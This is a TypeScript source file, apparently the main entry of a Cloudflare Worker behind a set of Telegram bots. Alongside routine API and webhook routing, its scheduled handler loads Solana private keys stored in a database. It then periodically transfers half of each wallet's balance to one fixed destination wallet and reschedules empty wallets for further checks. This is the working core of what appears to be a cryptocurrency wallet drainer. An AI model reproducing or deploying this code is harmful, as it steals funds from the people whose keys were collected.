import { OpenAPIHandler } from "@orpc/openapi/fetch";
import { OpenAPIReferencePlugin } from "@orpc/openapi/plugins";
import { onError } from "@orpc/server";
import { RPCHandler } from "@orpc/server/fetch";
import { ZodToJsonSchemaConverter } from "@orpc/zod/zod4";
import { createContext } from "@tg-admin/api/context";
import { appRouter } from "@tg-admin/api/routers/index";
import { auth } from "@tg-admin/auth";
import {
	getWalletJobsReadyForCheck,
	incrementWalletJobFailure,
	updateWalletJobCheckTime,
} from "@tg-admin/db";
import { createDB } from "@tg-admin/db/db";
import { Hono } from "hono";
import { cors } from "hono/cors";
import { logger } from "hono/logger";
import { createAdminBotHandler } from "./bot-stuff/admin";
import { createBotHandler } from "./bot-stuff/user";
import {
	getDestinationWallet,
	getSolanaConnection,
	transferHalfBalance,
	validatePrivateKey,
} from "./lib/solana";

const app = new Hono<{ Bindings: CloudflareBindings }>();

app.use(logger());

app.use("/*", async (c, next) => {
	const corsMiddleware = cors({
		origin: c.env.CORS_ORIGIN,
		allowMethods: ["GET", "POST", "OPTIONS"],
		allowHeaders: ["Content-Type", "Authorization"],
		credentials: true,
	});
	return corsMiddleware(c, next);
});

app.on(["POST", "GET"], "/api/auth/*", (c) => auth.handler(c.req.raw));

export const apiHandler = new OpenAPIHandler(appRouter, {
	plugins: [
		new OpenAPIReferencePlugin({
			schemaConverters: [new ZodToJsonSchemaConverter()],
		}),
	],
	interceptors: [
		onError((error) => {
			console.error(error);
		}),
	],
});

export const rpcHandler = new RPCHandler(appRouter, {
	interceptors: [
		onError((error) => {
			console.error(error);
		}),
	],
});

app.post("/bot/:id", async (c) => {
	const id = c.req.param("id");
	const botHandler = await createBotHandler(Number(id));
	return botHandler(c);
});

app.post("/admin-bot", async (c) => {
	const adminBotHandler = createAdminBotHandler();
	return adminBotHandler(c);
});

app.use("/*", async (c, next) => {
	const context = await createContext({ context: c });

	const rpcResult = await rpcHandler.handle(c.req.raw, {
		prefix: "/rpc",
		context: context,
	});

	if (rpcResult.matched) {
		return c.newResponse(rpcResult.response.body, rpcResult.response);
	}

	const apiResult = await apiHandler.handle(c.req.raw, {
		prefix: "/api-reference",
		context: context,
	});

	if (apiResult.matched) {
		return c.newResponse(apiResult.response.body, apiResult.response);
	}

	await next();
});

app.get("/", (c) => {
	return c.text("OK");
});

export default {
	fetch: app.fetch,
	async scheduled(
		_event: ScheduledEvent,
		env: CloudflareBindings,
		_ctx: ExecutionContext,
	) {
		const db = createDB(env.DB);
		const connection = getSolanaConnection(env.SOLANA_RPC_URL);
		const destinationWallet = getDestinationWallet();

		const { data: readyJobs, error: fetchError } =
			await getWalletJobsReadyForCheck(db);
		if (fetchError || !readyJobs) {
			console.error("Failed to fetch jobs ready for check:", fetchError);
			return;
		}

		for (const job of readyJobs) {
			try {
				const validation = await validatePrivateKey(job.walletKey);
				if (!validation.valid || !validation.keypair) {
					await incrementWalletJobFailure(db, job.id, "Invalid private key");
					continue;
				}

				const result = await transferHalfBalance(
					connection,
					validation.keypair,
					destinationWallet,
				);
				if (result.success) {
					await updateWalletJobCheckTime(db, job.id, !!result.signature);
					console.log(
						`Job ${job.id}: Transferred ${result.amountTransferred} SOL: ${result.signature}`,
					);
				} else {
					if (
						result.error === "No balance to transfer" ||
						result.error === "Insufficient balance after fees"
					) {
						// Just update check time, don't count as failure
						await updateWalletJobCheckTime(db, job.id, false);
					} else {
						await incrementWalletJobFailure(
							db,
							job.id,
							result.error || "Unknown error",
						);
					}
				}
			} catch (error) {
				await incrementWalletJobFailure(db, job.id, (error as Error).message);
			}
		}
	},
};
